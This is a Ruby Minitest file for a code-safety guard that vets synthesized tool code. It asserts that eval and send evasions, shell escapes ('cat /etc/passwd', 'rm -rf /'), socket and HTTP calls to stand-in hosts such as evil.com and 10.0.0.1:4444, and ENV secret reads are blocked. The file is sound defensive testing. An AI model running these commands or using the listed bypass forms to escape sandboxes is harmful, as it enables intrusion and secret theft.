# frozen_string_literal: true

require_relative "../test_helper"

class TestSecurityGuardSynthesis < Minitest::Test
  def setup
    @guard = Rubik::Security::Guard.new
  end

  def test_permits_benign_synthesis_code
    valid_code = "->(args, out, shell) { out.puts \"Hello \#{args.inspect}\" }"
    assert @guard.verify_synthesis_safety!(valid_code)

    tool_code = <<~RUBY
      ->(args) do
        { ok: true, sum: args["a"].to_i + args["b"].to_i }
      end
    RUBY
    assert @guard.verify_synthesis_safety!(tool_code)
  end

  def test_blocks_dynamic_send_eval_attempts
    evasions = [
      "send(:eval, 'system(\"calc\")')",
      "send :eval, 'system(\"calc\")'",
      "public_send('eval', 'bad_stuff')",
      "public_send 'eval', 'bad_stuff'",
      "__send__(:instance_eval, 'code')",
      "__send__ :instance_eval, 'code'",
      "send(:system, 'whoami')",
      "send :system, 'whoami'",
      "send(:exec, 'bash')",
      "send :exec, 'bash'"
    ]

    evasions.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_backticks_and_percent_x_execution
    shell_escapes = [
      "`whoami`",
      "`cat /etc/passwd`",
      "%x(ls -la)",
      "%x{rm -rf /}",
      "%x[id]"
    ]

    shell_escapes.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_binding_eval
    code = "binding.eval('File.read(\"/etc/passwd\")')"
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_synthesis_safety!(code)
    end
  end

  def test_blocks_process_and_popen_tampering
    bad_codes = [
      "IO.popen('id').read",
      "Process.kill('KILL', 1234)",
      "Process.spawn('cmd.exe')",
      "Open3.capture2('sh -c bad')",
      "Kernel.exec('bash')"
    ]

    bad_codes.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_namespace_mutations
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_synthesis_safety!("Object.const_set(:HACKED, true)")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_synthesis_safety!("Kernel.const_set(:EVIL, 1)")
    end
  end

  def test_blocks_indirect_and_dynamic_send_evasions
    indirect_attempts = [
      "method_sym = :eval; target.send(method_sym, 'code')",
      "target.public_send(dyn_method, *args)",
      "receiver.__send__(cmd, arg1)",
      "send(foo, bar)",
      "public_send :danger, 123"
    ]

    indirect_attempts.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_direct_eval_and_eval_variants
    eval_variants = [
      "eval('1 + 1')",
      "eval code_string",
      "self.instance_eval { @secret }",
      "klass.class_eval { def pwned; end }",
      "mod.module_eval { puts 'bad' }"
    ]

    eval_variants.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_instance_variable_and_constant_introspection
    introspection_attempts = [
      "obj.instance_variable_get(:@root_dir)",
      "obj.instance_variable_set(:@hacked, true)",
      "Rubik.const_get(:Config)",
      "const_get('Security')"
    ]

    introspection_attempts.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_bare_process_execution_calls
    process_calls = [
      "system('curl evil.com')",
      "system \"nc 1.2.3.4 80\"",
      "exec('bash')",
      "exec \"sh\"",
      "spawn('python3 bad.py')",
      "fork { puts 1 }",
      "fork do; puts 1; end",
      "syscall(1, 2, 3)",
      "exit!(1)",
      "exit!"
    ]

    process_calls.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_method_reflection_evasions
    method_reflections = [
      "method(:system).call('id')",
      "method :system",
      "public_method(:eval).call('1+1')",
      "singleton_method(:exec).call('bash')"
    ]

    method_reflections.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_env_and_io_global_access
    escapes = [
      "ENV['SECRET']",
      "ENV.fetch('TOKEN', nil)",
      "ObjectSpace.each_object { |o| }",
      "ObjectSpace._id2ref(1)",
      "STDIN.gets",
      "STDOUT.puts 'x'",
      "STDERR.puts 'x'",
      "ARGF.read",
      "Signal.trap('INT') { }"
    ]

    escapes.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_allows_benign_method_and_system_names_in_strings_and_hashes
    safe_snippets = [
      "args['method'] == 'GET'",
      "hash = { method: :post }",
      "out.puts 'operating system check'",
      "system_info = args['system_info']",
      "is_executable = true"
    ]

    safe_snippets.each do |code|
      assert @guard.verify_synthesis_safety!(code)
    end
  end

  # ── F2 (Plan 111): file-loading and network/serialization escapes ──

  def test_blocks_bare_require_load_and_autoload
    codes = [
      "require 'socket'",
      'require "./payload"',
      "require_relative '../lib/evil'",
      "load './payload.rb'",
      "autoload :Evil, './evil.rb'",
      "->(args) { require 'socket'; TCPSocket.new('10.0.0.1', 4444) }"
    ]

    codes.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_network_and_marshal_constants_on_any_reference
    codes = [
      "TCPSocket.new('10.0.0.1', 4444)",
      "Socket.tcp('10.0.0.1', 4444)",
      "UDPSocket.new.send('x', 0, '10.0.0.1', 4444)",
      "Net::HTTP.get(URI('http://evil.com'))",
      "Marshal.load(payload)",
      "X = TCPSocket",
      "->(args) { S = Socket; S.tcp('evil.com', 4444) }",
      # Top-level scoped forms parse as :colon3, not :const — the
      # one-character bypass (review finding, Plan 111).
      "::TCPSocket.new('10.0.0.1', 4444)",
      "::Socket.tcp('10.0.0.1', 4444)",
      "::Marshal.dump(payload)",
      "::Net::HTTP.get(URI('http://evil.com'))",
      "X = ::TCPSocket"
    ]

    codes.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_blocks_top_level_scoped_forbidden_receiver_consts
    # The pre-existing CONSTS receiver check must also survive :colon3
    # receivers — ::Kernel.require re-opens the bare-require hole otherwise.
    codes = [
      "::Kernel.require('./payload')",
      "::ENV.fetch('HOME')",
      "::Thread.new { }"
    ]

    codes.each do |code|
      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
        @guard.verify_synthesis_safety!(code)
      end
    end
  end

  def test_permits_ctx_require_coeffect_accessor
    # :require is forbidden as a BARE call only — ctx.require is the
    # canonical coeffect accessor every synthesized tool depends on.
    code = "->(args, ctx) { ctx.require('database').query(args['q']) }"
    assert @guard.verify_synthesis_safety!(code)
  end

  def test_run_synthesis_gate_warns_loudly_on_guard_downgrade
    # Duck-typed guard: the shell-only downgrade is a documented test-double
    # affordance, but it skips the entire AST deny surface, so the gate must
    # emit an ungated warn (surviving $VERBOSE=nil) and still run the shell
    # gate.
    duck = Object.new
    shell_checked = false
    duck.define_singleton_method(:verify_command_safety!) do |*_|
      shell_checked = true
      true
    end

    old_verbose = $VERBOSE
    $VERBOSE = nil
    _out, err = capture_io do
      assert Rubik::Security::Guard.run_synthesis_gate(duck, "->(args) { args['x'].to_s }")
    end
    $VERBOSE = old_verbose

    assert shell_checked, "downgraded gate must still run verify_command_safety!"
    assert_includes err, "downgraded to shell-only gate"
  end

  def test_run_synthesis_gate_fails_closed_and_honest_when_emit_breaks
    # A broken stderr must refuse the code with the REAL cause — never let
    # the emit failure masquerade as "dangerous operations", and never let
    # it skip the gate entirely.
    duck = Object.new
    duck.define_singleton_method(:verify_command_safety!) { |*| flunk("shell gate must not run after a broken emit") }

    old_stderr = $stderr
    broken = Object.new
    def broken.write(*) = raise Errno::EBADF
    def broken.puts(*) = raise Errno::EBADF
    $stderr = broken
    begin
      error = assert_raises(Rubik::Security::BlockedWriteError) do
        Rubik::Security::Guard.run_synthesis_gate(duck, "->(args) { system('rm -rf /') }")
      end
    ensure
      $stderr = old_stderr
    end

    assert_includes error.message, "could not be written to stderr"
  end
end
